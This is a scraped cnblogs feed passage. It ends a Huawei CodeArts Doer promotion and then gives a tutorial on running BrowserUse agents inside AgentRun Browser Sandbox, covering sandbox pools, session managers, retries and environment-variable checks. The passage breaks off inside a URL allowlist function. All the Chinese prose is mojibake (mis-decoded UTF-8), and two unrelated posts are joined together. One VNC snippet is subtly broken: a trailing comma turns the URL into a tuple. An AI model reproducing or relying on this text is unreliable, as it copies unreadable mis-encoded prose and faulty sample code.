<p>çæ­£éç¨äºçäº§ç¯å¢çAIç¼ç ï¼å³é®å¨äºâçè§£ä½ çé¡¹ç®âãCodebaseæ¯æç¾ä¸è¡çº§ä»£ç ç´¢å¼ãç¥è¯å¾è°±æå»ºãææ¡£çæä¸æ¼ååå²ç¥è¯æ²æ·ï¼åç¡®çè§£ä»£ç ä»ç»æãä¾èµå³ç³»ä¸ä¸å¡è¾¹çï¼åèº«æä¸ä½ä¸å±çä»£ç ç¥è¯ä¸å®¶ï¼å¸®å©æ°æåå¿«éä¸æãèæåå¿«éå®ä½ãåæ¶ï¼åç¡®æ£ç´¢è½åè®©AIæ´å¿«æ¾å°ä½ çæ­£éè¦çå½æ°ãæ¥å£ä¸å®ç°ç»èï¼åå°âçä¼¼æ­£ç¡®ãå®åä¸ééâççæåå®¹ï¼è®©æ¯ä¸æ¬¡å»ºè®®é½æ´è´´è¿é¡¹ç®ç°å®ã</p>
<p>&nbsp;<img alt="" data-src="https://img2024.cnblogs.com/blog/2030258/202601/2030258-20260120183417231-1140323952.png" class="lazyload"></p>
<p><strong>å¤ç§ç¨æ·åºæ¯ï¼è®©ç åä»âäººåä¸»å¯¼âèµ°åâäººæºå±åâ</strong></p>
<p>CodeArts Doerä»£ç æºè½ä½å·²å¨é¡¹ç®çº§ä»£ç çæãAgentç¥è¯å¢å¼ºãä»£ç ç»­åãç åç¥è¯é®ç­ãååæµè¯çæç­åºæ¯å®ç°å¼åèæçæåï¼åæ¶ä¹æ¯æä¸°å¯å·¥å·çæï¼å©åé«æå¼åä¸ä¸ªæ§åå®å¶ã</p>
<p>ç®åï¼CodeArts Doerä»£ç æºè½ä½ä¸ªäººçå·²ç»æ­£å¼åå¸ï¼é¢åå¹¿å¤§å¼åèå¼æ¾åè´¹ä½éªãè®©AIçæ­£èµ°è¿å·¥ç¨ãèµ°è¿æµç¨ãèµ°è¿äº¤ä»ââä»ä»å¤©èµ·ï¼å¼å¯ä½ çç¼ç èªå¨é©¾é©¶æ¨¡å¼ã</p>
<p>ä½éªCodeArts Doerä»£ç æºè½ä½ï¼<a href="https://developer.huaweicloud.com/signup/78745481cafb4d79bf62096f6770c72e?channelCode=hcdg" target="_blank" rel="noopener nofollow">https://developer.huaweicloud.com/signup/78745481cafb4d79bf62096f6770c72e?channelCode=hcdg</a></p>
<p>&nbsp;</p>
</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 18:34">2026-01-20 18:34</span>&nbsp;
<a href="https://www.cnblogs.com/huaweiyun">åä¸ºäºå¼åèèç</a>&nbsp;
éè¯»(<span id="post_view_count">22</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19508288);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19508288', targetLink: 'https://www.cnblogs.com/huaweiyun/p/19508288', title: 'åä¸ºäºåå¸CodeArts Doerä»£ç æºè½ä½ä¸ªäººçï¼ä¸é®å¼å¯ä½ çç¼ç èªå¨é©¾é©¶æ¨¡å¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ è¿é¶æåï¼BrowserUse + Agentrun Sandbox æä½³å®è·µæå ]]></title>
    <link>https://www.cnblogs.com/Serverless/p/19507367</link>
    <guid>653a53287200fff87edeaef7ad5b608b</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Serverless/p/19507367" title="åå¸äº 2026-01-20 16:12">
    <span role="heading" aria-level="2">è¿é¶æåï¼BrowserUse + Agentrun Sandbox æä½³å®è·µæå</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p><strong>æç¤º</strong>: æ¬ææ¯AgentRun Browser Sandbox å¿«éä¸æå®è·µæåçå§å¦¹ç¯,ä¸æ³¨äºé«çº§éææ¹æ¡ãçäº§ç¯å¢çæä½³å®è·µãæ§è½ä¼ååé¨ç½²ç­ç¥ãå¦ææ¨è¿æ²¡æå®æåºç¡å­¦ä¹ ,è¯·åéè¯»<a href="https://mp.weixin.qq.com/s/2LjN6LxymuZNlWUR-nhrEg" target="_blank" rel="noopener nofollow">ãå¿«éä¸æï¼LangChain + AgentRun æµè§å¨æ²ç®±æç®éææåã</a>ã</p>
</blockquote>
<h2 id="åè¨">åè¨</h2>
<p>å¨å®æäº Browser Sandbox çåºç¡éæä¹åï¼æ¬æå°ä»ç»é«çº§éææ¹æ¡ï¼å¦ BrowserUse æ¡æ¶ï¼ä»¥åçäº§ç¯å¢é¨ç½²éè¦èèçå ç´ ï¼å¦ä½ç®¡ç Sandbox çå½å¨æï¼å¦ä½ä¼åæ§è½åææ¬ï¼å¦ä½ä¿è¯ç³»ç»çå®å¨æ§åå¯è§æµæ§ï¼æ¬æå°ä¸ºæ¨æä¾å¨é¢çé«çº§åºç¨åçäº§ç¯å¢æä½³å®è·µæåã</p>
<h2 id="åºäº-browseruse-éæ-browser-sandbox">åºäº BrowserUse éæ Browser Sandbox</h2>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2123714/202601/2123714-20260120161152867-1802574501.png" class="lazyload"></p>
<p>&lt;æææªå¾&gt;</p>
<p>BrowserUse æ¯ä¸ä¸ªä¸é¨ä¸º AI Agent è®¾è®¡çæµè§å¨èªå¨åæ¡æ¶,æ¯æè§è§çè§£åæºè½å³ç­ãéè¿ AgentRun Browser Sandboxï¼æ¨å¯ä»¥è®© BrowserUse å¨äºç«¯è¿è¡,äº«å Serverless æ¶æçä¼å¿ã</p>
<h3 id="browseruse-æ¶ææ¦è§">BrowserUse æ¶ææ¦è§</h3>
<p>ä¸å¾å±ç¤ºäº BrowserUse ä¸ Browser Sandbox çéææ¶æï¼</p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2123714/202601/2123714-20260120161152818-592122718.png" class="lazyload"></p>
<p><strong>æ¶æç¹ç¹ï¼</strong></p>
<ol>
<li><strong>æºè½å³ç­å¾ªç¯</strong>ï¼Agent éè¿ LLM åæé¡µé¢æªå¾,åºäºè§è§çè§£çææä½æä»¤ï¼æ§è¡æä½åç»§ç»­å¾ªç¯ï¼ç´å°ä»»å¡å®æ</li>
<li><strong>æ å¤´æµè§å¨æ§å¶</strong>ï¼éè¿ CDP åè®®è¿ç¨æ§å¶äºç«¯æµè§å¨ï¼Playwright ä½ä¸ºåºå±é©±å¨ï¼æææä½å¨äºç«¯æ§è¡</li>
<li><strong>å®æ¶å¯è§å</strong>ï¼VNC æä¾å®æ¶ç»é¢çæ§,æ¹ä¾¿è°è¯åéªè¯ Agent è¡ä¸º</li>
</ol>
<h3 id="å¿«éå¼å§">å¿«éå¼å§</h3>
<h4 id="å®è£ä¾èµ">å®è£ä¾èµ</h4>
<pre><code class="language-bash">pip install browser-use python-dotenv agentrun-sdk[playwright,server]
</code></pre>
<p>ä¸»è¦ä¾èµè¯´æï¼</p>
<ul>
<li><code>browser-use</code>: BrowserUse æ ¸å¿åº,æ¯æå¤æ¨¡æ LLM</li>
<li><code>agentrun-sdk[playwright,server]</code>: AgentRun SDKï¼ç¨äºåå»º Sandbox</li>
<li><code>python-dotenv</code>: ç¯å¢åéç®¡ç</li>
</ul>
<h4 id="éç½®ç¯å¢åé">éç½®ç¯å¢åé</h4>
<p>åå»º <code>.env</code> æä»¶ï¼</p>
<pre><code class="language-bash"># DashScope API Keyï¼ç¨äº Qwen æ¨¡åï¼
DASHSCOPE_API_KEY=sk-your-dashscope-api-key

# AgentRun è®¤è¯ä¿¡æ¯
AGENTRUN_ACCOUNT_ID=your-account-id
ALIBABA_CLOUD_ACCESS_KEY_ID=your-access-key-id
ALIBABA_CLOUD_ACCESS_KEY_SECRET=your-access-key-secret

# Browser Sandbox æ¨¡æ¿åç§°
BROWSER_TEMPLATE_NAME=sandbox-browser-demo
</code></pre>
<h4 id="åå»º-sandbox-å¹¶ä½¿ç¨-browseruse">åå»º Sandbox å¹¶ä½¿ç¨ BrowserUse</h4>
<pre><code class="language-python">import asyncio
import os
from agentrun.sandbox import Sandbox, TemplateType
from browser_use import Agent, BrowserSession, ChatOpenAI
from browser_use.browser import BrowserProfile
from dotenv import load_dotenv

load_dotenv()

async def main():
    # åå»º Browser Sandbox
    sandbox = Sandbox.create(
        template_type=TemplateType.BROWSER,
        template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
        sandbox_idle_timeout_seconds=3000
    )
    
    # éç½® Qwen å¤æ¨¡ææ¨¡å
    llm = ChatOpenAI(
        model='qwen-vl-max',
        api_key=os.getenv("DASHSCOPE_API_KEY"),
        base_url="https://dashscope.aliyuncs.com/compatible-mode/v1"
    )
    
    # åå»ºæµè§å¨ä¼è¯
    browser_session = BrowserSession(
        cdp_url=sandbox.get_cdp_url(),
        browser_profile=BrowserProfile(
            headless=False,
            timeout=3000000,
            keep_alive=True
        )
    )
    
    # åå»º Agent å¹¶æ§è¡ä»»å¡
    agent = Agent(
        task="è®¿é®é¿éäºå®ç½å¹¶æ»ç»ä¸»è¦äº§ååç±»",
        llm=llm,
        browser_session=browser_session,
        use_vision=True
    )
    
    result = await agent.run()
    
    print(f"ä»»å¡ç»æ: {result.final_result()}")
    
    # æ¸çèµæº
    await browser_session.stop()
    sandbox.delete()

if __name__ == "__main__":
    asyncio.run(main())
</code></pre>
<h3 id="browseruse-é«çº§éç½®">BrowserUse é«çº§éç½®</h3>
<h4 id="èªå®ä¹æµè§å¨è¡ä¸º">èªå®ä¹æµè§å¨è¡ä¸º</h4>
<pre><code class="language-python">browser_profile = BrowserProfile(
    timeout=3000000,             # è¶æ¶æ¶é´ï¼æ¯«ç§ï¼
    keep_alive=True,             # ä¿æä¼è¯æ´»è·
)
</code></pre>
<h4 id="å¤æ­¥éª¤ä»»å¡ç¼æ">å¤æ­¥éª¤ä»»å¡ç¼æ</h4>
<pre><code class="language-python">async def complex_task():
    """å¤æçå¤æ­¥éª¤ä»»å¡"""
    sandbox = Sandbox.create(
        template_type=TemplateType.BROWSER,
        template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
        sandbox_idle_timeout_seconds=3000
    )
    
    llm = ChatOpenAI(
        model='qwen-vl-max',
        api_key=os.getenv("DASHSCOPE_API_KEY"),
        base_url="https://dashscope.aliyuncs.com/compatible-mode/v1"
    )
    
    browser_session = BrowserSession(
        cdp_url=sandbox.cdp_url,
        browser_profile=BrowserProfile(keep_alive=True)
    )
    
    # ä»»å¡ 1ï¼ä¿¡æ¯æ¶é
    agent1 = Agent(
        task="è®¿é®é¿éäºå®ç½ï¼æ¶éäº§ååç±»ä¿¡æ¯",
        llm=llm,
        browser_session=browser_session,
        use_vision=True
    )
    result1 = await agent1.run()
    
    # ä»»å¡ 2ï¼åºäºç¬¬ä¸æ­¥ç»æç»§ç»­æä½
    agent2 = Agent(
        task=f"åºäºä»¥ä¸ä¿¡æ¯ï¼{result1.final_result()}ï¼è®¿é®æ¯ä¸ªäº§ååç±»å¹¶æåå³é®ç¹æ§",
        llm=llm,
        browser_session=browser_session,
        use_vision=True
    )
    result2 = await agent2.run()
    
    # æ¸çèµæº
    await browser_session.stop()
    sandbox.delete()
    
    return result2.final_result()
</code></pre>
<h4 id="éæ-vnc-å®æ¶çæ§">éæ VNC å®æ¶çæ§</h4>
<pre><code class="language-python">import webbrowser
import urllib.parse

async def run_with_vnc_monitoring():
    """è¿è¡ BrowserUse å¹¶å¯ç¨ VNC çæ§"""
    sandbox = Sandbox.create(
        template_type=TemplateType.BROWSER,
        template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
        sandbox_idle_timeout_seconds=3000
    )
    
    # è·å VNC URL å¹¶æå¼æ¥çå¨
    vnc_url = sandbox.get_vnc_url(),
    if vnc_url:
        # ä¿®å¤ VNC URL è·¯å¾
        if vnc_url.endswith('/vnc'):
            vnc_url = vnc_url[:-4] + '/ws/livestream'
        
        # å¨æµè§å¨ä¸­æå¼ VNC æ¥çå¨
        encoded_url = urllib.parse.quote(vnc_url, safe='')
        viewer_url = f"file://path/to/vnc-viewer.html?url={encoded_url}"
        webbrowser.open(viewer_url)
        print(f"VNC æ¥çå¨å·²æå¼ï¼å¯å®æ¶çæ§æµè§å¨æä½")
    
    # åå»ºå¹¶è¿è¡ Agent
    llm = ChatOpenAI(
        model='qwen-vl-max',
        api_key=os.getenv("DASHSCOPE_API_KEY"),
        base_url="https://dashscope.aliyuncs.com/compatible-mode/v1"
    )
    
    browser_session = BrowserSession(
        cdp_url=sandbox.get_cdp_url(),
        browser_profile=BrowserProfile(headless=False, keep_alive=True)
    )
    
    agent = Agent(
        task="è®¿é®æ·å®é¦é¡µå¹¶æç´¢åå",
        llm=llm,
        browser_session=browser_session,
        use_vision=True
    )
    
    result = await agent.run()
    
    # æ¸çèµæº
    await browser_session.stop()
    sandbox.delete()
    
    return result.final_result()
</code></pre>
<h3 id="browseruse-æä½³å®è·µ">BrowserUse æä½³å®è·µ</h3>
<ol>
<li><strong>å¯ç¨è§è§çè§£</strong>ï¼å¯¹äºå¤æé¡µé¢ï¼ä½¿ç¨ <code>use_vision=True</code> è®© LLM åæé¡µé¢æªå¾</li>
<li><strong>ä¿æä¼è¯æ´»è·</strong>ï¼ä½¿ç¨ <code>keep_alive=True</code> é¿åé¢ç¹éå»ºè¿æ¥</li>
<li><strong>åçè®¾ç½®è¶æ¶</strong>ï¼æ ¹æ®ä»»å¡å¤æåº¦è°æ´ <code>timeout</code> åæ°</li>
<li><strong>å¤ç¨ BrowserSession</strong>ï¼å¯¹äºå¤æ­¥éª¤ä»»å¡ï¼å¤ç¨åä¸ä¸ª BrowserSession æé«æç</li>
<li><strong>ç»å VNC è°è¯</strong>ï¼å¼åé¶æ®µå¯ç¨ VNC å®æ¶æ¥ç Agent è¡ä¸º</li>
</ol>
<h3 id="è·åå®æ´ç¤ºä¾ä»£ç ">è·åå®æ´ç¤ºä¾ä»£ç </h3>
<p>æ¬æä¸­çææç¤ºä¾ä»£ç é½å¯ä»¥å¨ä»¥ä¸ä»åºä¸­æ¾å°ï¼</p>
<pre><code class="language-bash"># åéç¤ºä¾ä»£ç ä»åº
git clone https://github.com/devsapp/agentrun-sandbox-demos.git

# è¿å¥é¡¹ç®ç®å½
cd agentrun-browseruse-wth-sandbox-demo

# å®è£ä¾èµï¼æ³¨æéè¦å®è£ server æ©å±ï¼
pip install -r requirements.txt
</code></pre>
<h4 id="éç½®ç¯å¢åé-1">éç½®ç¯å¢åé</h4>
<pre><code class="language-bash"># å¤å¶ç¯å¢åéæ¨¡æ¿
cp env.example .env

# ç¼è¾ .env æä»¶ï¼å¡«å¥æ¨çéç½®ä¿¡æ¯
# å¿ééç½®é¡¹ï¼
# - DASHSCOPE_API_KEY: DashScope API Keyï¼ç¨äº Qwen æ¨¡åï¼
# - AGENTRUN_ACCOUNT_ID: AgentRun è´¦å· ID
# - ALIBABA_CLOUD_ACCESS_KEY_ID: é¿éäºè®¿é®å¯é¥ ID
# - ALIBABA_CLOUD_ACCESS_KEY_SECRET: é¿éäºè®¿é®å¯é¥ Secret
# - BROWSER_TEMPLATE_NAME: Browser Sandbox æ¨¡æ¿åç§°
</code></pre>
<h4 id="è¿è¡ç¤ºä¾ä¸¤æ­¥è¿è¡è®¾è®¡">è¿è¡ç¤ºä¾ï¼ä¸¤æ­¥è¿è¡è®¾è®¡ï¼</h4>
<p>æ¬é¡¹ç®éç¨<strong>æå¡å¨-å®¢æ·ç«¯</strong>çæ¶æè®¾è®¡ï¼éè¦åä¸¤æ­¥è¿è¡ï¼</p>
<p><strong>ç¬¬ä¸æ­¥ï¼å¯å¨ VNC æ¥çå¨æå¡</strong></p>
<pre><code class="language-bash"># å¨ç»ç«¯ 1 ä¸­å¯å¨ VNC Web æå¡å¨
python main.py

# æå¡å¯å¨åä¼æ¾ç¤ºï¼
# VNC æ¥çå¨æå¡å·²å¯å¨: http://localhost:8000
# è®¿é® http://localhost:8000 å¯ä»¥å®æ¶æ¥çæµè§å¨æä½
</code></pre>
<p><code>main.py</code> çä½ç¨ï¼</p>
<ul>
<li>å¯å¨æ¬å° Web æå¡å¨ï¼æä¾ VNC å®æ¶æ¥ççé¢</li>
<li>æä¾ WebSocket ä»£çï¼è¿æ¥ AgentRun Sandbox ç VNC æå¡</li>
<li>åè®¸æ¨å¨æµè§å¨ä¸­å®æ¶çæ§ Agent çæä½è¿ç¨</li>
</ul>
<p><strong>ç¬¬äºæ­¥ï¼è¿è¡ BrowserUse ç¤ºä¾</strong></p>
<pre><code class="language-bash"># å¨ç»ç«¯ 2 ä¸­è¿è¡ç¤ºä¾ä»£ç 
python examples/01_browseruse_basic.py

# è¿è¡é«çº§ç¤ºä¾
python examples/02_browseruse_advanced.py
</code></pre>
<p><strong>ä¸ºä»ä¹éè¦ä¸¤æ­¥è¿è¡ï¼</strong></p>
<ol>
<li><strong>å®æ¶çæ§</strong>ï¼main.py æä¾ VNC æ¥çå¨ï¼å¯ä»¥å®æ¶çå° Agent å¨æµè§å¨ä¸­çæä½</li>
<li><strong>è°è¯åå¥½</strong>ï¼éè¿å¯è§åçé¢ï¼æ´å®¹æçè§£ Agent çå³ç­è¿ç¨åè¡ä¸º</li>
<li><strong>æå¡è§£è¦</strong>ï¼VNC æå¡åä¸å¡é»è¾åç¦»ï¼å¯ä»¥åæ¶è¿è¡å¤ä¸ªç¤ºä¾èå±ç¨åä¸ä¸ªæ¥çå¨</li>
</ol>
<p><strong>è¿è¡æµç¨å¾ï¼</strong></p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2123714/202601/2123714-20260120161152812-1325245902.png" class="lazyload"></p>
<p><strong>ä»åºåå®¹åæ¬ï¼</strong></p>
<ul>
<li><code>main.py</code>: VNC Web æå¡å¨ï¼ç¨äºå®æ¶çæ§</li>
<li><code>examples/01_browseruse_basic.py</code>: åºç¡éæç¤ºä¾</li>
<li><code>examples/02_browseruse_advanced.py</code>: é«çº§éç½®ç¤ºä¾</li>
<li><code>examples/sandbox_manager.py</code>: Sandbox çå½å¨æç®¡ç</li>
<li><code>vncviewer/</code>: VNC æ¥çå¨åç«¯ååç«¯ä»£ç </li>
<li>å®æ´çç¯å¢éç½®åæä½³å®è·µä»£ç </li>
</ul>
<hr>
<h2 id="sandbox-çå½å¨æç®¡çæä½³å®è·µ">Sandbox çå½å¨æç®¡çæä½³å®è·µ</h2>
<h3 id="ä¸ç§ç®¡çæ¨¡å¼">ä¸ç§ç®¡çæ¨¡å¼</h3>
<p>æ ¹æ®ä¸åçåºç¨åºæ¯,æä»¬æ¨èä¸ç§ Sandbox ç®¡çæ¨¡å¼ï¼</p>
<p><img alt="" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2123714/202601/2123714-20260120161152792-1428609621.png" class="lazyload"></p>
<p><strong>æ¹æ¡å¯¹æ¯ï¼</strong></p>
<table>
<thead>
<tr>
<th>ç®¡çæ¨¡å¼</th>
<th>ä¼ç¹</th>
<th>ç¼ºç¹</th>
<th>éç¨åºæ¯</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>åä¾æ¨¡å¼</strong></td>
<td>â¢ èµæºå¤ç¨   â¢ ååºå¿«   â¢ ç®åæç¨</td>
<td>â¢ ç¶ææ±¡æé£é©   â¢ ä¸éåå¹¶å</td>
<td>å¼åè°è¯   å¤è½®å¯¹è¯   ä¸ªäººåºç¨</td>
</tr>
<tr>
<td><strong>è¯·æ±çº§å«</strong></td>
<td>â¢ ç¯å¢éç¦»   â¢ ç¶æç¬ç«   â¢ å®å¨æ§é«</td>
<td>â¢ åå»ºå¼éå¤§   â¢ ææ¬è¾é«</td>
<td>ä¸æ¬¡æ§ä»»å¡   é«å®å¨éæ±   æ ç¶ææå¡</td>
</tr>
<tr>
<td><strong>è¿æ¥æ± </strong></td>
<td>â¢ å¹¶åè½åå¼º   â¢ èµæºå©ç¨çé«   â¢ æ§è½ç¨³å®</td>
<td>â¢ å®ç°å¤æ   â¢ éè¦çæ§</td>
<td>çäº§ç¯å¢   é«å¹¶åæå¡   ä¼ä¸åºç¨</td>
</tr>
</tbody>
</table>
<h3 id="åä¾æ¨¡å¼å®ç°">åä¾æ¨¡å¼å®ç°</h3>
<p>éåå¼åè°è¯åå¤è½®å¯¹è¯åºæ¯ï¼</p>
<pre><code class="language-python">class SandboxManager:
    """åä¾æ¨¡å¼ Sandbox ç®¡çå¨"""
    _instance = None
    _sandbox = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def get_or_create(self):
        """è·åæåå»º Sandbox"""
        if self._sandbox is None:
            self._sandbox = Sandbox.create(
                template_type=TemplateType.BROWSER,
                template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
                sandbox_idle_timeout_seconds=3000
            )
        return self._sandbox
    
    def destroy(self):
        """éæ¯ Sandbox"""
        if self._sandbox:
            self._sandbox.delete()
            self._sandbox = None

# ä½¿ç¨
manager = SandboxManager()
sandbox = manager.get_or_create()  # é¦æ¬¡åå»º
sandbox = manager.get_or_create()  # å¤ç¨ç°æå®ä¾
</code></pre>
<h3 id="è¿æ¥æ± æ¨¡å¼å®ç°">è¿æ¥æ± æ¨¡å¼å®ç°</h3>
<p>éåé«å¹¶åçäº§ç¯å¢ï¼</p>
<pre><code class="language-python">from queue import Queue
from threading import Lock

class SandboxPool:
    """Sandbox è¿æ¥æ± """
    
    def __init__(self, pool_size=5, max_idle_time=300):
        self.pool_size = pool_size
        self.max_idle_time = max_idle_time
        self.pool = Queue(maxsize=pool_size)
        self.lock = Lock()
        self._initialize_pool()
    
    def _initialize_pool(self):
        """åå§åè¿æ¥æ± """
        for _ in range(self.pool_size):
            sandbox = self._create_sandbox()
            self.pool.put(sandbox)
    
    def _create_sandbox(self):
        """åå»º Sandbox å®ä¾"""
        return Sandbox.create(
            template_type=TemplateType.BROWSER,
            template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
            sandbox_idle_timeout_seconds=self.max_idle_time
        )
    
    def acquire(self, timeout=30):
        """è·å Sandbox å®ä¾"""
        try:
            sandbox = self.pool.get(timeout=timeout)
            if not self._is_alive(sandbox):
                sandbox = self._create_sandbox()
            return sandbox
        except:
            raise RuntimeError("è·å Sandbox è¶æ¶")
    
    def release(self, sandbox):
        """å½è¿ Sandbox å®ä¾"""
        if self._is_alive(sandbox):
            self.pool.put(sandbox)
        else:
            new_sandbox = self._create_sandbox()
            self.pool.put(new_sandbox)
    
    def _is_alive(self, sandbox):
        """æ£æ¥ Sandbox æ¯å¦å­æ´»"""
        try:
            return hasattr(sandbox, 'sandbox_id')
        except:
            return False

# ä½¿ç¨
pool = SandboxPool(pool_size=5)

sandbox = pool.acquire()
try:
    # ä½¿ç¨ sandbox æ§è¡ä»»å¡
    pass
finally:
    pool.release(sandbox)
</code></pre>
<h3 id="ä¼è¯ç¶æç®¡ç">ä¼è¯ç¶æç®¡ç</h3>
<p>æ¯æå¤ç¨æ·å¤ä¼è¯åºæ¯ï¼</p>
<pre><code class="language-python">import time

class SessionManager:
    """ä¼è¯ç¶æç®¡ç"""
    
    def __init__(self):
        self.sessions = {}  # session_id -&gt; sandbox
    
    def create_session(self, session_id: str):
        """åå»ºä¼è¯"""
        if session_id not in self.sessions:
            sandbox = Sandbox.create(
                template_type=TemplateType.BROWSER,
                template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
                sandbox_idle_timeout_seconds=1800
            )
            self.sessions[session_id] = {
                'sandbox': sandbox,
                'created_at': time.time(),
                'last_used': time.time()
            }
        return self.sessions[session_id]['sandbox']
    
    def get_session(self, session_id: str):
        """è·åä¼è¯"""
        if session_id in self.sessions:
            session = self.sessions[session_id]
            session['last_used'] = time.time()
            return session['sandbox']
        return None
    
    def cleanup_expired_sessions(self, max_idle_time=1800):
        """æ¸çè¿æä¼è¯"""
        current_time = time.time()
        expired_sessions = []
        
        for session_id, session in self.sessions.items():
            if current_time - session['last_used'] &gt; max_idle_time:
                expired_sessions.append(session_id)
        
        for session_id in expired_sessions:
            self.destroy_session(session_id)
    
    def destroy_session(self, session_id: str):
        """éæ¯ä¼è¯"""
        if session_id in self.sessions:
            self.sessions[session_id]['sandbox'].delete()
            del self.sessions[session_id]
</code></pre>
<h2 id="æ§è½ä¼å">æ§è½ä¼å</h2>
<h3 id="è¶æ¶æ¶é´éç½®">è¶æ¶æ¶é´éç½®</h3>
<p>åçè®¾ç½®è¶æ¶æ¶é´æ¯å¹³è¡¡æ§è½åææ¬çå³é®ï¼</p>
<pre><code class="language-python"># å¼åç¯å¢ï¼è°è¯ç¨ï¼
sandbox = Sandbox.create(
    template_name="dev-template",
    sandbox_idle_timeout_seconds=7200  # 2 å°æ¶
)

# çäº§ç¯å¢ï¼åæ¬¡ä»»å¡ï¼
sandbox = Sandbox.create(
    template_name="prod-template",
    sandbox_idle_timeout_seconds=300  # 5 åé
)

# é¿æ¶é´ä»»å¡
sandbox = Sandbox.create(
    template_name="long-task-template",
    sandbox_idle_timeout_seconds=10800  # 3 å°æ¶
)
</code></pre>
<p><strong>è¶æ¶ç­ç¥æ¨èï¼</strong></p>
<table>
<thead>
<tr>
<th>åºæ¯</th>
<th>æ¨èè¶æ¶</th>
<th>è¯´æ</th>
</tr>
</thead>
<tbody>
<tr>
<td>å¼åè°è¯</td>
<td>1-2 å°æ¶</td>
<td>æ¹ä¾¿è°è¯,é¿åé¢ç¹éå»º</td>
</tr>
<tr>
<td>ç®åä»»å¡</td>
<td>5-10 åé</td>
<td>åé¡µæä½,å¿«éå®æ</td>
</tr>
<tr>
<td>å¤æä»»å¡</td>
<td>30-60 åé</td>
<td>å¤æ­¥éª¤æµç¨,éè¦æ¶é´</td>
</tr>
<tr>
<td>åå°æå¡</td>
<td>2-4 å°æ¶</td>
<td>é¿æè¿è¡,å®æå·æ°</td>
</tr>
</tbody>
</table>
<h3 id="sandbox-å¤ç¨ç­ç¥">Sandbox å¤ç¨ç­ç¥</h3>
<pre><code class="language-python">class SmartSandboxManager:
    """æºè½ Sandbox å¤ç¨ç®¡çå¨"""
    
    def __init__(self):
        self.sandboxes = {}  # key -&gt; sandbox
        self.usage_count = {}  # key -&gt; count
    
    def get_sandbox(self, user_id: str, session_id: str):
        """è·åæåå»º Sandboxï¼æ¯æå¤ç¨ï¼"""
        key = f"{user_id}:{session_id}"
        
        if key not in self.sandboxes:
            self.sandboxes[key] = Sandbox.create(
                template_type=TemplateType.BROWSER,
                template_name=os.getenv("BROWSER_TEMPLATE_NAME"),
                sandbox_idle_timeout_seconds=1800
            )
            self.usage_count[key] = 0
        
        self.usage_count[key] += 1
        return self.sandboxes[key]
    
    def should_recreate(self, key: str, max_reuse=50):
        """å¤æ­æ¯å¦éè¦éå»ºï¼é²æ­¢ç¶æç´¯ç§¯ï¼"""
        return self.usage_count.get(key, 0) &gt;= max_reuse
    
    def recreate_if_needed(self, key: str):
        """æééå»º Sandbox"""
        if self.should_recreate(key):
            if key in self.sandboxes:
                self.sandboxes[key].delete()
                del self.sandboxes[key]
                self.usage_count[key] = 0
</code></pre>
<h3 id="éè¯¯å¤çåéè¯æºå¶">éè¯¯å¤çåéè¯æºå¶</h3>
<p>ä½¿ç¨ tenacity åºå®ç°æºè½éè¯ï¼</p>
<pre><code class="language-python">from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type

class SandboxError(Exception):
    """Sandbox æä½å¼å¸¸"""
    pass

@retry(
    retry=retry_if_exception_type(SandboxError),
    stop=stop_after_attempt(3),
    wait=wait_exponential(multiplier=1, min=2, max=10)
)
def execute_with_retry(sandbox, operation):
    """å¸¦éè¯çæä½æ§è¡"""
    try:
        return operation(sandbox)
    except ConnectionError:
        raise SandboxError("è¿æ¥å¤±è´¥")
    except TimeoutError:
        raise SandboxError("æä½è¶æ¶")
    except Exception as e:
        print(f"æä½å¤±è´¥: {e}")
        raise SandboxError(f"æä½å¤±è´¥: {e}")

# ä½¿ç¨ç¤ºä¾
def navigate_page(sandbox):
    with sync_playwright() as p:
        browser = p.chromium.connect_over_cdp(sandbox.cdp_url)
        page = browser.contexts[0].pages[0]
        page.goto("https://example.com", timeout=30000)
        return page.title()

result = execute_with_retry(sandbox, navigate_page)
</code></pre>
<h2 id="å®å¨æ§æä½³å®è·µ">å®å¨æ§æä½³å®è·µ</h2>
<h3 id="ç¯å¢åéä¿æ¤">ç¯å¢åéä¿æ¤</h3>
<pre><code class="language-python">import os
from dotenv import load_dotenv

load_dotenv()

# éªè¯å¿éçç¯å¢åé
required_vars = ["DASHSCOPE_API_KEY", "AGENTRUN_ACCOUNT_ID"]
missing_vars = [var for var in required_vars if not os.getenv(var)]
if missing_vars:
    raise ValueError(f"ç¼ºå°å¿éçç¯å¢åé: {', '.join(missing_vars)}")

# ææä¿¡æ¯ä¸è¦ç¡¬ç¼ç 
API_KEY = os.getenv("DASHSCOPE_API_KEY")
ACCESS_KEY_ID = os.getenv("ALIBABA_CLOUD_ACCESS_KEY_ID")
ACCESS_KEY_SECRET = os.getenv("ALIBABA_CLOUD_ACCESS_KEY_SECRET")
</code></pre>
<h3 id="url-ç½åå">URL ç½åå</h3>
<pre><code class="language-python">ALLOWED_DOMAINS = [
    'example.com',
    'aliyun.com',
    'alibaba.com'
]

def is_url_allowed(url: str) -&gt; bool:
    """æ£æ¥ URL æ¯å¦å¨ç½ååä¸­"""
    from urllib.parse import urlparse
    domain = urlparse(url).netloc
